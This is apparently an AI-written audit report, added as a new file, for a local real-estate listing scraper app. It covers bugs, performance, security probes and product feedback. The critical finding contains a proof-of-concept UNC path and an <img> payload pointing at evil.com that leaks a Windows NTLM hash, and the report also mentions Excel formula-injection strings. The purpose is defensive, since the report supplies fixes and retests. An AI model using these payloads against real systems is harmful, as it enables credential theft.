@@ -1,0 +1,222 @@
+HOMESWEEPER - FULL BUG, SECURITY AND PRODUCT AUDIT
+Date: 2026-11-10, branch dev (last commit c113f86)
+Nothing in the repo was changed during this audit. All tests ran on copies of the DB.
+
+For a new coding session: read this file, then the "Bug list" in NOTES.md. The fixes for #1-#3
+below are small and the ones for #2 and #3 were already tested (code is included here).
+
+=====================================================================================
+HOW IT WAS TESTED
+=====================================================================================
+- Read every source file and ran pyflakes over all of it.
+- Ran the real Scraper.Server app twice on other ports (8765/8766), pointed at copies of the DB:
+    a) the real 220 listings + 3 hostile listings (XSS, Excel formulas, rich markup, control chars,
+       40,000-char title, 300 photos, 300 tags)
+    b) 20,000 listings (the real ones multiplied)
+  The scrape engine was replaced with a fake one, so no live site was hit.
+- Security probes (Host/Origin/CSRF/CORS, path traversal incl. Windows backslashes, headers),
+  API fuzzing, a race test (16 threads, 11,455 play/pause/interval requests), Playwright UI tests
+  (XSS, console/CSP errors, phone width, speed at 20k), fuzzing of Derive/Search/scraper helpers,
+  Excel benchmarks.
+- One live HEADLESS turn of 2 listings per site (nothing saved to the DB).
+
+Test scripts were in the session scratchpad (temporary, may be deleted):
+  C:\Users\mezin\AppData\Local\Temp\claude\dd1e7efd1d97eb82\a4dbc6b4-c6d2-456e-851d-5d55650a96bf\scratchpad\
+  harness.py (runs Server with a fake engine on a test DB), seed.py (hostile + 20k DBs), fuzz.py,
+  race.py, ui_test.py, ui_perf.py, excel_bench.py, excel_fix_check.py
+  They are a good starting point for a pytest suite.
+
+=====================================================================================
+CRITICAL
+=====================================================================================
+
+#1  Any website can make HomeSweeper open a network (SMB) connection to a server it picks
+    Where: Scraper/Server.py, the static mount at the end: app.mount("/", StaticFiles(...))
+    What:  On Windows, a URL like  /%5c%5cevil.com%5cshare%5cx  becomes  \\evil.com\share\x.
+           Starlette's StaticFiles does os.path.join(UI_DIR, path) (which returns the UNC path,
+           dropping UI_DIR) and then os.path.realpath() on it BEFORE its "inside the folder" check.
+           realpath opens the path, so Windows connects over SMB to evil.com and can send the
+           agent's NTLM password hash. A plain <img src="http://127.0.0.1:8000/%5c%5cevil.com%5cx">
+           on any website the agent visits is enough: a GET passes the Host check (Host is 127.0.0.1).
+    Also a DoS: each request holds a worker thread ~40 s; 45 of them froze every API call for ~40 s.
+    Evidence: normal 404 = 0.003 s; UNC to 127.0.0.1 = 2.1 s; UNC to unroutable 10.255.255.1 = 42 s.
+              Server log: FileNotFoundError [WinError 53] The network path was not found:
+              '\\\\10.255.255.35\\s\\x'
+    Fix:   a middleware (or a StaticFiles subclass overriding get_path) that answers 404 for any
+           request path containing "\", ":" or a NUL byte, before the static mount sees it. Example:
+
+             @app.middleware("http")
+             async def no_windows_paths(request, call_next):
+                 path = request.url.path
+                 if "\\" in path or ":" in path or "\x00" in path:
+                     return JSONResponse({"detail": "Not Found"}, status_code=404)
+                 return await call_next(request)
+
+           Retest: GET /%5c%5c10.255.255.1%5cs%5cx must answer 404 in milliseconds.
+           Also fixes the 500 on "/app.js%00.html" (null byte).
+
+#2  The Excel export becomes unusable after a few thousand listings (quadratic)
+    Where: Scraper/Output.py, append_row() (around line 95)
+    What:  after each sheet.append() it reads sheet[sheet.max_row]; openpyxl's max_row/max_column
+           scan every cell, so building the workbook is O(rows^2).
+    Evidence: build_workbook 500 rows 1.2 s, 2,000 rows 29 s, 5,000 rows 63 s, 20,000 rows > 5 min
+              (the UI download never finished). The per-turn Output/listings.xlsx (save_listings,
+              called 4x per turn) took 5.1 s to append 50 rows to a 5,000-row file, and keeps growing.
+    Fix (tested: 20,000 rows in 7.9 s, formula injection still blocked):
+
+             def append_row(sheet, values):
+                 sheet.append(values)
+                 row = sheet._current_row  #The row append() just wrote, no scan of the sheet
+                 for column, value in enumerate(values, start=1):
+                     if isinstance(value, str) and value.startswith("="):
+                         sheet.cell(row=row, column=column).data_type = "s"
+
+           Also decide whether the per-turn Output/listings.xlsx is still needed (NOTES to-do 9);
+           it loads the whole growing file 4 times per turn.
+
+=====================================================================================
+HIGH
+=====================================================================================
+
+#3  One malicious listing can slow down every agent's app (quadratic regex)
+    Where: Scraper/Search.py CENTER_TAG (line ~35) and Scraper/Derive.py CENTER_DISTANCE (line ~125)
+    What:  \d+(?:[.,]\d+)?\s*k?m... restarts at every digit of a long digit run -> O(n^2).
+           Runs on every listing on every cache rebuild and every search. All agents scrape the same
+           public sites, so one seller posting a description full of digits hits everyone.
+    Evidence: 2,000 digits 0.09 s, 4,000 0.36 s, 8,000 1.44 s (x4 per doubling).
+    Fix (tested: 200,000 digits in 0.012 s, same matches on "2.4km nga qendra, 982m nga qendra"):
+           add a lookbehind so a match can't start in the middle of a number:
+             CENTER_TAG      = re.compile(r"(?<![\d.,])\d+(?:[.,]\d+)?\s*k?m\s+nga\s+qendra")
+             CENTER_DISTANCE = re.compile(r"(?<![\d.,])(\d+(?:[.,]\d+)?)\s*(km|m)\s+nga\s+qendra")
+
+#4  "Send every listing to the browser" doesn't scale (measured at 20,000 listings)
+    - /api/listings: 46 MB JSON (10 MB gzipped), 1.7-2.4 s on the server
+    - first cards in the browser after 7.5 s
+    - the UI freezes 4.8 s after EVERY finished turn (loadListings reloads everything)
+    - server process uses 621 MB RAM (157 MB with 220 listings)
+    - AI near-miss search (POST /api/ai/search, few results): 12.9 s
+      typical best_match search: 3.8 s
+      Cause: score() calls searchable_text() again for every listing in sort_listings("best_match"),
+      match_reasons() does it again, and near_misses ranks ALL candidates to return 12.
+    - With 5 blocked sellers, /api/listings went from 2.4 s to 4.6 s (phone_keys regex per listing per request)
+    Fix: slim list endpoint (card fields only) + /api/listings/{id} + ?since= for new rows
+         (REVIEW.md roadmap #10); cache searchable_text per listing in the listings cache; in
+         near_misses only rank what is returned. Agents will reach these sizes in weeks of
+         continuous scraping.
+    Note: the dashboard filters themselves are fine at 20k (render() 60-160 ms).
+
+#5  "Jo agjenci" / private-seller filter can't be trusted yet
+    - MerrJep: posted_by = "Kompani" on all 55 listings (bug B2, still open).
+    - Njoftime: 48 of 55 marked Kompani by the name/logo guess (mostly right on the data seen;
+      "Ina FutureHome" slips through as private because \bhomes?\b needs a word start).
+    For agents, finding private sellers is the main point of the product.
+
+=====================================================================================
+MEDIUM
+=====================================================================================
+- B5 (still open): deleting today's questions from Historia resets the $2/day AI cap; failed paid
+  calls (refusal, max_tokens, unreadable answer) are never counted.
+- B9 (still open): a fallback model's answer is priced at Opus 5.5 rates.
+  (Checked against the model reference: Opus 5.5 = $4 in / $20 out / $0.20 cache read per MTok,
+  cache write 1.25x = $5; effort "low", fallbacks "default" + beta server-side-fallback-2026-07-01
+  and json_schema output are all valid. So the constants in AI.py are correct.)
+- Data sanity:
+  - A MerrJep listing titled "JEPET ME QIRA APARTAMENT 2+1 ... DON BOSKO" is stored as listing_type
+    "Shitet" at 750 EUR. Nothing flags a sale under ~5,000 EUR (Derive only checks rents: RENT_EUR_RANGE).
+  - Gazeta "Shitet në ankand" (auction) is not in Search.LISTING_TYPES, so the AI's "Shitet" filter misses it.
+  - Condition wording still unmerged in the DB and Excel (I ri / E re / E rikonstruktuar / Ne gjendje te mire).
+  - Njoftime published_date = last refresh, not the posting date (known, documented).
+- Phone numbers and names printed in full to the console (MerrJep dumps the whole listing JSON).
+  Becomes stored personal data once Phase 4 writes log files (REVIEW.md #5).
+- Still no tests, no CI, no requirements.txt. Every bug above was found in minutes by fuzzing.
+- State still lives in memory (play/pause, break, agency preference, RESUME_PAGE...) - known, Phase 4.
+
+=====================================================================================
+LOW
+=====================================================================================
+- 500 instead of 400/404 (unhandled exceptions):
+  - ids above 2^63: GET /api/ai/history/<id>, DELETE /api/ai/history/<id>, DELETE /api/blocked/<id>
+    -> OverflowError: Python int too large to convert to SQLite INTEGER (not a sqlite.Error, so not caught)
+  - POST /api/ai/search {"filters":{"posted_within_days":1000000}} -> OverflowError: date value out of range
+    (Search.failures: date.today() - timedelta(days=...)). Clamp it in the Filters validator (e.g. <= 36500).
+  - "/app.js%00.html" -> ValueError embedded null character (fixed by the #1 middleware)
+- Duashpi split_location(",") -> IndexError (parts is empty). Would fail that listing as "unexpected".
+- Search.searchable_text crashes (TypeError) if phone is not a string (can't happen from the DB today).
+- Basement floor "kati -1" is not read by Derive.floor_in_text.
+- B10 confirmed still open: MerrJep combine_phones("+355691234567", "0691234567") keeps both
+  (compares all digits; the other scrapers compare the last 9).
+- B11 confirmed still open: Duashpi parse_price("1.5 milion €") -> (1.5, "EUR").
+- B12 still open: "Mbledhja e fundit" shows only a time, no date.
+- UI/index.html line 18: header says "MerrJep, Gazeta Celësi dhe Duashpi" - Njoftime is missing.
+- UI/app.js line ~1025 (openGallery show()): main.src = images[current] skips safeUrl().
+  The CSP blocked the javascript: image in the test, but use safeUrl() like everywhere else.
+- The "Nis me orar" time picker shows "08:00 AM" (browser locale) instead of 24-hour time.
+- POST /api/auto/start {"interval_minutes": true} is accepted as 1 minute (pydantic lax mode;
+  use StrictInt or check the type).
+- The scrapers' __main__ blocks (python -m GazetaCelesi.PlaywrightScraper etc., listed in CLAUDE.md)
+  don't call utf8_output(), so they crash on emoji titles when output is redirected (cp1252).
+- No request body size limit (a 9 MB /api/ai/search body took 16 s at 20k listings; only our own
+  page can send it, so low risk).
+- pyflakes: Scraper/Version.py unused variable "Version"; Tools/Performance.py unused "import time".
+- Version string "1.0.0/11/2026" is not valid for packaging.version (known, NOTES "Versioning").
+
+=====================================================================================
+WHAT IS GOOD (verified, not assumed)
+=====================================================================================
+- Host check, Origin check and no CORS blocked every DNS-rebinding and cross-site attempt:
+  foreign Host -> 400; POST with no/foreign/null/other-port Origin -> 403; no CORS headers on reads.
+- Normal path traversal blocked (../, %2e%2e, %2f, %5c..%5c all 404).
+- Security headers (CSP, nosniff, no-referrer, no-cache) on every response.
+- SQL is parameterised everywhere; no secrets in the git history; the key file is git-ignored.
+- No XSS: hostile titles/descriptions render as text, javascript: links become "#", CSP is a second layer.
+- Excel formula injection blocked ("=HYPERLINK...", "=cmd|..." stored as text, not formulas);
+  control characters stripped; cells cut at 32,767 chars.
+- Play/pause scheduler: 11,455 concurrent requests from 16 threads, never two turns at once,
+  clean state after pause, next turn scheduled correctly after the break.
+- The error-handling block is byte-identical in all four scrapers.
+- All four scrapers work HEADLESS today (first headless test for Duashpi and Njoftime):
+  MerrJep 2 in 20 s, Gazeta 2 in 7 s, Duashpi 2 in 22 s, Njoftime 2 in 11 s, all ended "ok", no blocks.
+- Dashboard filtering is fast at 20k listings; the phone layout (375 px) has no sideways scroll.
+- Albanian UI text is consistent; code is well documented.
+- Data: 0 duplicate UPIDs or URLs; 220 listings, 55 per site.
+
+=====================================================================================
+PRODUCT ASSESSMENT
+=====================================================================================
+As a customer (real estate agent):
+- Real value: four sites in one place, phone numbers, Albanian AI search, block sellers, Excel.
+- Friction:
+  - Tall cards in a sideways strip show ~3 listings per screen (REVIEW.md #14: grid + compact card).
+  - On a phone the header takes ~250 px; the first listing is below the fold.
+  - Operator controls (break, schedule, agency preference) sit in the agent's face (REVIEW.md #15).
+  - The AI setup note tells agents to edit Data/anthropic_api_key.txt - not for non-technical users.
+  - Errors say "Shiko konsolën e serverit" - agents have no console.
+  - "Mbledhja e fundit" shows only a time.
+- What agents would pay more for: "new since yesterday" alerts, price-drop tracking,
+  merging the same flat posted on several sites, export of the filtered set only.
+
+As a business:
+- Agents in one office share one public IP. Five copies scraping the same four sites from one IP
+  is the most likely way to get blocked. Stagger them, or plan a central scraper later.
+- Legal check needed: storing private sellers' names and phone numbers falls under Albania's
+  personal data protection law; each site has its own terms of use.
+- AI cost: worst case ~$60 per agent per month at the $2/day cap. Build it into the price.
+- Still undecided: the AI needs a key and contacts Anthropic, which contradicts "nothing phones home"
+  and "no licence keys" in CLAUDE.md -> Product architecture.
+- Owner installs on every PC: fine for ~20 agents, doesn't scale beyond that (code signing then needed).
+
+As an engineer / QA:
+- Scraper code copied four times (~560 lines each); app.js over 2,000 lines; all scraper state in
+  module globals; everything derived at read time.
+- No automated tests - every bug above would only be found by hand.
+
+=====================================================================================
+SUGGESTED ORDER
+=====================================================================================
+1. Fix #1 (UNC path middleware), #2 (Excel append_row) and #3 (regex lookbehind). Small, fixes above.
+2. Resolve B2 (MerrJep "Kompani" on everything).
+3. Input guards for the 500s (big ids, posted_within_days, split_location) + the sale/rent sanity check
+   + add "Shitet në ankand" handling.
+4. Turn the test scripts into a pytest suite (Derive/Search fuzz, API security checks, race test).
+5. Slim list endpoint + incremental loading (?since=) before agents reach ~5k listings.
+6. Add the new findings to the Bug list in NOTES.md.
